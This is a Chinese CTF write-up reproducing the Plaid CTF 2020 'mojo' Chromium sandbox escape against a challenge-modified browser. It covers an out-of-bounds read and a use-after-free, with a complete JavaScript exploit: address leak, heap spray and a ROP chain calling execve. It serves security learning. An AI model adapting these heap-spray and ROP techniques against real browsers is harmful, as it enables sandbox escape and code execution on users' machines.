> 原文链接: https://www.anquanke.com//post/id/209800 


# Plaid CTF 2020 mojo 复现 - chromium sandbox escape


                                阅读量   
                                **181283**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01c7c152ff64ef20ef.jpg)](https://p2.ssl.qhimg.com/t01c7c152ff64ef20ef.jpg)



Plaid ctf 2020 的一道 chromium sandbox escape 题目，比较基础，适合入门， 题目文件可以在[这里](https://play.plaidctf.com/files/mojo-837fd2df59f60214ffa666a0b71238b260ffd9114fd612a7f633f4ba1b4da74f.tar.gz) 下载, exp 参考来自[这里](https://trungnguyen1909.github.io/blog/post/PlaidCTF2020/)



## 漏洞分析

题目写了一个`plaidstore.mojom` 文件，定义了`PlaidStore`接口，有`StoreData` 和 `GetData` 两个函数

```
--- /dev/null
+++ b/third_party/blink/public/mojom/plaidstore/plaidstore.mojom
@@ -0,0 +1,11 @@
+module blink.mojom;
+
+// This interface provides a data store
+interface PlaidStore `{`
+
+  // Stores data in the data store
+  StoreData(string key, array&lt;uint8&gt; data);
+
+  // Gets data from the data store
+  GetData(string key, uint32 count) =&gt; (array&lt;uint8&gt; data);
+`}`;
```

可以用下面方式调用到这两个函数

```
p = blink.mojom.PlaidStore.getRemote(true);
p.storeData("aaaa",new Uint8Array(0x10));
p.getData("aaaa",0x200))
```

`PlaidStoreImpl` 有两个成员, `render_frame_host_` 保存当前的 `RenderFrameHost` ， 它用来描述网页本身，`data_store_`用来存放数据。

```
+class PlaidStoreImpl : public blink::mojom::PlaidStore `{`
    ...
+ private:
+  RenderFrameHost* render_frame_host_;
+  std::map&lt;std::string, std::vector&lt;uint8_t&gt; &gt; data_store_;
+`}`;
```

`PlaidStoreImpl::StoreData` 存入传入的data，这里data 是 `uint8_t` 类型，`data_store_` 是一个 vector 会自动给对应的key申请内存

```
+void PlaidStoreImpl::StoreData(
+    const std::string &amp;key,
+    const std::vector&lt;uint8_t&gt; &amp;data) `{`
+  if (!render_frame_host_-&gt;IsRenderFrameLive()) `{`
+    return;
+  `}`
+  data_store_[key] = data;
+`}`
+
```

`PlaidStoreImpl::GetData` 有两个参数，`count` 表示要返回的数量，如果调用`p.getData("aaaa",0x200));`, 这个时候`it`是`key == "aaaa"` 的时候保存的数据，结果会返回index在 `[0,0x200)` 返回的数据， 这里并没有对count做检查，假如执行 `p.storeData("aaaa",new Uint8Array(0x100));p.getData("aaaa",0x200))`, 可以成功返回数据，于是这里就有了一个越界读，可以用来泄露数据。

```
+void PlaidStoreImpl::GetData(
+    const std::string &amp;key,
+    uint32_t count,
+    GetDataCallback callback) `{`
+  if (!render_frame_host_-&gt;IsRenderFrameLive()) `{`
+    std::move(callback).Run(`{``}`);
+    return;
+  `}`
+  auto it = data_store_.find(key);
+  if (it == data_store_.end()) `{`
+    std::move(callback).Run(`{``}`);
+    return;
+  `}`
    //[1]
+  std::vector&lt;uint8_t&gt; result(it-&gt;second.begin(), it-&gt;second.begin() + count);
+  std::move(callback).Run(result);
+`}`
```

两个函数开头的处都会检查`render_frame_host_-&gt;IsRenderFrameLive()`, 但是并没有检查`render_frame_host_` 是否可用，我们可以创建一个`iframe` ，内部执行 `p = blink.mojom.PlaidStore.getRemote(true);` 并返回给 `parent`, 然后删除这个`iframe`，这个时候`render_frame_host_` 被释放了，但是仍可以调用`p.getData` 和`p.storeData`

于是可以进行堆喷获取到被释放的`render_frame_host_` , 改写其函数指针，然后在执行`render_frame_host_-&gt;IsRenderFrameLive()` 的时候就可以劫持控制流。



## 漏洞利用

通过前面的分析，现在有了地址泄露和uaf，后续的基本利用流程如下
- 1 泄露出 chrome 的基地址 =&gt; 获取gadget
<li>2 添加`iframe`, 返回`render_frame_host_` 的地址和 `p`
</li>
- 3 删除 iframe, 堆喷改写`iframe`的 `render_frame_host_` ，写入gadget 代码执行
接下来一个一个看

### <a class="reference-link" name="%E8%B0%83%E8%AF%95"></a>调试

题目给出了`Dockerfile` 可以直接搞个`Docker` 来调试，这里我在`ubuntu1804`下， 执行`./chrome   --disable-gpu --remote-debugging-port=1338  --enable-blink-features=MojoJS,MojoJSTest` 运行`chrome`， 然后`gdb attach` 即可， 因为这里是调试 mojo代码，我们attach browser进程(第一个)

编写 exp, `mojo_js.zip` 解压到`www` 目录下， 这里我的exp 写在`www/poc/e2xp.html` 里面, 包含好对应的`js`，然后启动web服务器就可以访问了

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;style&gt;
            body `{`
              font-family: monospace;
            `}`
        &lt;/style&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;script src="../mojo/public/js/mojo_bindings_lite.js"&gt;&lt;/script&gt;
        &lt;script src="../third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"&gt;&lt;/script&gt;
        &lt;script&gt;
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
```

### <a class="reference-link" name="%E6%B3%84%E9%9C%B2%20chrome%20%E5%9F%BA%E5%9C%B0%E5%9D%80"></a>泄露 chrome 基地址

`PlaidStore` 对象创建的时候会分配内存, 可以想下面这样找函数的地址

```
chrome$ nm --demangle  ./chrome |grep -i 'PlaidStoreImpl::Create'
0000000003c58490 t content::PlaidStoreImpl::Create(content::RenderFrameHost*, mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt;)
```

gdb 下查看 `content::PlaidStoreImpl::Create` 代码如下

```
push   rbp
mov    rbp,rsp
push   r15
push   r14
push   rbx
sub    rsp,0x38
mov    r14,rsi
mov    rbx,rdi
// PlaidStore 对象分配内存 ==&gt; buffer64
mov    edi,0x28
call   0x55555ac584b0 &lt;operator new(unsigned long, std::nothrow_t const&amp;)&gt;
// rcx == vtable
lea    rcx,[rip+0x635e2ec]        # 0x55555f50a7a0 &lt;vtable for content::PlaidStoreImpl+16&gt;
// buffer64[0] =  vtable
mov    QWORD PTR [rax],rcx
// buffer64[1] =  render_frame_host_
mov    QWORD PTR [rax+0x8],rbx
lea    rcx,[rax+0x18]
xorps  xmm0,xmm0
movups XMMWORD PTR [rax+0x18],xmm0

```

所以如果执行

```
p.storeData("aaaa",Uint8Array(0x28));
blink.mojom.PlaidStore.getRemote(true)
```

那么`Uint8Array` 的backing store 和 PlaidStore对象很有可能会连续分配，多次执行上面代码，只要两者内存连续分配的手，就可以通过`p.getData` 泄露出`vtable` 和 `render_frame_host_` 的地址，通过`vtable` 即可计算出 `chrome` 的基地址。

内存泄露的代码如下

```
function show(msg)`{`
    document.body.innerHTML+=msg+"&lt;br&gt;";
`}`
async function main()`{`
    var stores = [];
    let p = blink.mojom.PlaidStore.getRemote(true); 

    for(let i=0;i&lt;0x40;i++)`{`
        tmp=new Uint8Array(0x28);
        tmp[0]=i;
        tmp[1]=0x13;
        tmp[2]=0x37;
        tmp[3]=0x13;
        tmp[4]=0x37;
        tmp[5]=0x13;
        tmp[6]=0x37;
        tmp[7]=0x13;
        await p.storeData("yeet"+i,tmp);
        stores[i] = blink.mojom.PlaidStore.getRemote(true)
    `}`
    let chromeBase = 0;
    let renderFrameHost = 0;
    for(let i = 0;i&lt;0x40&amp;&amp;chromeBase==0;i++)`{`
        let d = (await p.getData("yeet"+i,0x200)).data;
        let u8 = new Uint8Array(d)
        let u64 = new BigInt64Array(u8.buffer);
        for(let j = 5;j&lt;u64.length;j++)`{`
            let l = u64[j]&amp;BigInt(0xf00000000000)
            let h = u64[j]&amp;BigInt(0x000000000fff)
            if((l==BigInt(0x500000000000))&amp;&amp;h==BigInt(0x7a0))`{`
                show(i.toString(16)+' '+j+' 0x'+u64[j].toString(16));

                chromeBase = u64[j]-BigInt(0x9fb67a0);
                renderFrameHost = u64[j+1];
                break;
            `}`
        `}`
    `}`
    show("ChromeBase: 0x"+chromeBase.toString(16));
    show("renderFrameHost: 0x"+renderFrameHost.toString(16));
    return 0 ;
`}`
main();
```

执行后效果如图

[![](https://p2.ssl.qhimg.com/t017333d01f3e44867f.png)](https://p2.ssl.qhimg.com/t017333d01f3e44867f.png)

### <a class="reference-link" name="%E6%9E%84%E9%80%A0%20uaf"></a>构造 uaf

接下来是构造`uaf` , 首先是`var frame = document.createElement("iframe");` 创建一个 `iframe`, 然后`frame.srcdoc` 写入代码, 具体参考最后完整exp， 代码和前面 泄露地址一样，把`iframe` 里面的 `render_frame_host_` 地址泄露出来，然后把`PlaidStore` 对象和`iframe` 的 `render_frame_host_` 地址传递给 `parent`， `parent` 执行`document.body.removeChild(frame)` 释放 `iframe` ，接下来堆喷尝试重新拿到被释放的`render_frame_host_` 的内存

`RenderFrameHost` 对象使用`content::RenderFrameHostFactory::Create()` 函数创建

```
chrome$ nm --demangle  ./chrome |grep -i 'content::RenderFrameHostFactory::Create'  
0000000003b219e0 t content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)
```

对应的代码如下，`RenderFrameHost` 对象的大小是`0xc28`, 所以只需要喷一堆`0xc28` 大小的 `ArrayBuffer` 就有可能重新拿到被释放的对象

```
0x0000555559075a50 &lt;+112&gt;:   jmp    0x555559075aca &lt;content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::Fram
eTree*, content::FrameTreeNode*, int, int, bool)+234&gt;
// new(0xc28) 
   0x0000555559075a52 &lt;+114&gt;:   mov    edi,0xc28
   0x0000555559075a57 &lt;+119&gt;:   call   0x55555ac584b0 &lt;operator new(unsigned long, std::nothrow_t const&amp;)&gt;
   0x0000555559075a5c &lt;+124&gt;:   mov    rdi,rax
   0x0000555559075a5f &lt;+127&gt;:   mov    rax,QWORD PTR [r14]
   0x0000555559075a62 &lt;+130&gt;:   mov    QWORD PTR [rbp-0x38],rax
   0x0000555559075a66 &lt;+134&gt;:   mov    QWORD PTR [r14],0x0
   0x0000555559075a6d &lt;+141&gt;:   sub    rsp,0x8
   0x0000555559075a71 &lt;+145&gt;:   movzx  eax,BYTE PTR [rbp+0x20]
   0x0000555559075a75 &lt;+149&gt;:   lea    rdx,[rbp-0x38]
   0x0000555559075a79 &lt;+153&gt;:   mov    r14,rdi
   0x0000555559075a7c &lt;+156&gt;:   mov    rsi,rbx
   0x0000555559075a7f &lt;+159&gt;:   mov    rcx,r13
   0x0000555559075a82 &lt;+162&gt;:   mov    r8,r12
   0x0000555559075a85 &lt;+165&gt;:   mov    r9,r15

```

### <a class="reference-link" name="rop%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"></a>rop 代码执行

查看`GetData` 函数的汇编代码

```
0000000003c582b0 t content::PlaidStoreImpl::GetData(std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, unsigned int, base::OnceCallback&lt;void (std::__1::vector&lt;unsigned char, std::__1::allocator&lt;unsigned char&gt; &gt; const&amp;)&gt;)
```

调用`IsRenderFrameLive`基调用 `vtable + 0x160` 的位置， rax 保存 `vtable` 的值

```
0x00005555591ac2c7 &lt;+23&gt;:    mov    r14,rsi              
   0x00005555591ac2ca &lt;+26&gt;:    mov    rbx,rdi                        
   0x00005555591ac2cd &lt;+29&gt;:    mov    rdi,QWORD PTR [rdi+0x8]// rdi == render_frame_host_   
   0x00005555591ac2d1 &lt;+33&gt;:    mov    rax,QWORD PTR [rdi] // rax ==&gt; vtable 
   0x00005555591ac2d4 &lt;+36&gt;:    call   QWORD PTR [rax+0x160]  // vtable+0x160 ==&gt; IsRenderFrameLive
```

我们可以构造下面的内存布局

```
frame_addr =&gt;   [0x00] : vtable  ==&gt; frame_addr + 0x10  ---
                [0x08] : gadget =&gt; pop rdi                 |
            /-- [0x10] : frame_addr + 0x180 &lt;-----------------------
            |   [0x18] : gadget =&gt; pop rax                          |
            |   [0x20] : gadget =&gt; SYS_execve                       | vtable+0x10   
            |   [0x28] : gadget =&gt; xor rsi, rsi; pop rbp; jmp rax   |
            |   ...                                                 V
            |   [0x160 + 0x10] : xchg rax, rsp    &lt;= isRenderFrameLive
            |   [0x160 + 0x18] : 
            -&gt; [0x180 ... ] : "/home/chrome/flag_printer"
```

这里将`vtable -&gt; isRenderFrameLive` 处改成`xchg rax, rsp` ， 因为 `rax` 保存`vtable` 的地址， 所以`rsp` 变成了`frame_addr + 0x10` 的地址，继续执行，最终相当于执行 拿到flag

```
execve("/home/chrome/flag_printer",rsi,env);
```

### <a class="reference-link" name="%E5%AE%8C%E6%95%B4exp"></a>完整exp

完整exp如下

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;style&gt;
            body `{`
              font-family: monospace;
            `}`
        &lt;/style&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;script src="../mojo/public/js/mojo_bindings_lite.js"&gt;&lt;/script&gt;
        &lt;script src="../third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"&gt;&lt;/script&gt;
        &lt;script&gt;
function show(msg)`{`
    document.body.innerHTML+=msg+"&lt;br&gt;";
`}`
async function main()`{`
    var stores = [];
    let p = blink.mojom.PlaidStore.getRemote(true); 

    for(let i=0;i&lt;0x40;i++)`{`
        tmp=new Uint8Array(0x28);
        tmp[0]=i;
        tmp[1]=0x13;
        tmp[2]=0x37;
        tmp[3]=0x13;
        tmp[4]=0x37;
        tmp[5]=0x13;
        tmp[6]=0x37;
        tmp[7]=0x13;
        await p.storeData("yeet"+i,tmp);
        stores[i] = blink.mojom.PlaidStore.getRemote(true)
    `}`
    let chromeBase = 0;
    let renderFrameHost = 0;
    for(let i = 0;i&lt;0x40&amp;&amp;chromeBase==0;i++)`{`
        let d = (await p.getData("yeet"+i,0x200)).data;
        let u8 = new Uint8Array(d)
        let u64 = new BigInt64Array(u8.buffer);
        for(let j = 5;j&lt;u64.length;j++)`{`
            let l = u64[j]&amp;BigInt(0xf00000000000)
            let h = u64[j]&amp;BigInt(0x000000000fff)
            if((l==BigInt(0x500000000000))&amp;&amp;h==BigInt(0x7a0))`{`
                show(i.toString(16)+' '+j+' 0x'+u64[j].toString(16));

                chromeBase = u64[j]-BigInt(0x9fb67a0);
                renderFrameHost = u64[j+1];
                break;
            `}`
        `}`
    `}`
    show("ChromeBase: 0x"+chromeBase.toString(16));
    show("renderFrameHost: 0x"+renderFrameHost.toString(16));

    const kRenderFrameHostSize = 0xc28;

    var frameData = new ArrayBuffer(kRenderFrameHostSize);
    var frameData8 = new Uint8Array(frameData).fill(0x0);
    var frameDataView = new DataView(frameData)    
    var ropChainView = new BigInt64Array(frameData,0x10);
    frameDataView.setBigInt64(0x160+0x10,chromeBase + 0x880dee8n,true); //xchg rax, rsp 
    frameDataView.setBigInt64(0x180, 0x2f686f6d652f6368n,false);
    frameDataView.setBigInt64(0x188, 0x726f6d652f666c61n,false);
    frameDataView.setBigInt64(0x190, 0x675f7072696e7465n,false);// /home/chrome/flag_printer; big-endian
    frameDataView.setBigInt64(0x198, 0x7200000000000000n,false);// /home/chrome/flag_printer; big-endian
    ropChainView[0] = 0xdeadbeefn; // RIP rbp :&lt;
    ropChainView[1] = chromeBase + 0x2e4630fn; //pop rdi;
    ropChainView[2] = 0x4141414141414141n; // frameaddr+0x180
    ropChainView[3] = chromeBase + 0x2e651ddn; // pop rax;
    ropChainView[4] = chromeBase + 0x9efca30n; // execve@plt
    ropChainView[5] = chromeBase + 0x8d08a16n; // xor rsi, rsi; pop rbp; jmp rax
    ropChainView[6] = 0xdeadbeefn; // rbp
    //Constrait: rdx = 0; rdi pointed to ./flag_reader
    var allocateFrame = () =&gt;`{`
        var frame = document.createElement("iframe");

        frame.srcdoc=`&lt;script src="../mojo/public/js/mojo_bindings_lite.js"&gt;&lt;/script&gt;
        &lt;script src="../third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"&gt;&lt;/script&gt;
            &lt;script&gt;
              let p = blink.mojom.PlaidStore.getRemote(true);
              window.p = p;
            async function leak() `{`
                //Same code with the one in pwn.js
                var stores = [];
                for(let i = 0;i&lt; 0x40; i++ )`{`
                    await p.storeData("yeet"+i,new Uint8Array(0x28).fill(0x41));
                    stores[i] = blink.mojom.PlaidStore.getRemote(true);
                `}`
                let chromeBase = 0;
                let renderFrameHost = 0;
                for(let i = 0;i&lt;0x40&amp;&amp;chromeBase==0;i++)`{`
                    let d = (await p.getData("yeet"+i,0x200)).data;
                    let u8 = new Uint8Array(d)
                    let u64 = new BigInt64Array(u8.buffer);
                    for(let j = 5;j&lt;u64.length;j++)`{`
                        let l = u64[j]&amp;BigInt(0xf00000000000)
                        let h = u64[j]&amp;BigInt(0x000000000fff)
                        if((l==BigInt(0x500000000000))&amp;&amp;h==BigInt(0x7a0))`{`
                            chromeBase = u64[j]-BigInt(0x9fb67a0);
                            renderFrameHost = u64[j+1];
                            break;
                        `}`
                    `}`
                `}`
                window.chromeBase = chromeBase;
                window.renderFrameHost = renderFrameHost;
                window.p = p;
                return chromeBase!=0&amp;&amp;renderFrameHost!=0;
            `}`
            &lt;/script&gt;
        `

        frame.srcdoc=`
            &lt;!DOCTYPE html&gt;
            &lt;html&gt;
                &lt;head&gt;
                &lt;/head&gt;
                &lt;body&gt;
                    &lt;script src="../mojo/public/js/mojo_bindings_lite.js"&gt;&lt;/script&gt;
                    &lt;script src="../third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"&gt;&lt;/script&gt;
                &lt;script&gt;
                  var p = blink.mojom.PlaidStore.getRemote(true);
                async function leak() `{`
                    //Same code with the one in pwn.js
                    console.log("Starting frame leak");
                    var stores = [];
                    for(let i = 0;i&lt; 0x40; i++ )`{`
                        await p.storeData("yeet"+i,new Uint8Array(0x28).fill(0x41));
                        stores[i] = blink.mojom.PlaidStore.getRemote(true);
                    `}`
                    let chromeBase = 0;
                    let renderFrameHost = 0;
                    for(let i = 0;i&lt;0x40&amp;&amp;chromeBase==0;i++)`{`
                        let d = (await p.getData("yeet"+i,0x200)).data;
                        let u8 = new Uint8Array(d)
                        let u64 = new BigInt64Array(u8.buffer);
                        for(let j = 5;j&lt;u64.length;j++)`{`
                            let l = u64[j]&amp;BigInt(0xf00000000000)
                            let h = u64[j]&amp;BigInt(0x000000000fff)
                            if((l==BigInt(0x500000000000))&amp;&amp;h==BigInt(0x7a0))`{`
                                chromeBase = u64[j]-BigInt(0x9fb67a0);
                                renderFrameHost = u64[j+1];
                                break;
                            `}`
                        `}`
                    `}`
                    window.chromeBase = chromeBase;
                    window.renderFrameHost = renderFrameHost;
                    window.p = p;
                    return chromeBase!=0&amp;&amp;renderFrameHost!=0;
                `}`
                &lt;/script&gt;
                &lt;/body&gt;
            &lt;/html&gt;
            `
        document.body.appendChild(frame);
        return frame;
    `}`
    var frame = allocateFrame();


    frame.contentWindow.addEventListener("DOMContentLoaded",async ()=&gt;`{`
        if(!(await frame.contentWindow.leak()))`{`
            show("frame leak failed!");
            return;
        `}`
        if(frame.contentWindow.chromeBase!=chromeBase)`{`
            show("different chrome base!! wtf!")
            return;
        `}`    
        var frameAddr = frame.contentWindow.renderFrameHost;
//        show(frameAddr.toString(16));
        frameDataView.setBigInt64(0,frameAddr+0x10n,true); //vtable/ rax


        ropChainView[2] = frameAddr + 0x180n;
        var frameStore = frame.contentWindow.p;
        document.body.removeChild(frame);
        var arr = [];
        for(let i = 0;i&lt; 0x400;i++)`{`
            await p.storeData("bruh"+i,frameData8);
        `}`
          await frameStore.getData("yeet0",0);

    `}`);

`}`
main();
//document.addEventListener("DOMContentLoaded",()=&gt;`{`main();`}`);

        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
```



## reference

[https://pwnfirstsear.ch/2020/04/20/plaidctf2020-mojo.html](https://pwnfirstsear.ch/2020/04/20/plaidctf2020-mojo.html)

[https://github.com/A-0-E/writeups/tree/master/plaidctf-2020](https://github.com/A-0-E/writeups/tree/master/plaidctf-2020)

[https://gist.github.com/ujin5/5b9a2ce2ffaf8f4222fe7381f792cb38](https://gist.github.com/ujin5/5b9a2ce2ffaf8f4222fe7381f792cb38)

[https://trungnguyen1909.github.io/blog/post/PlaidCTF2020/](https://trungnguyen1909.github.io/blog/post/PlaidCTF2020/)
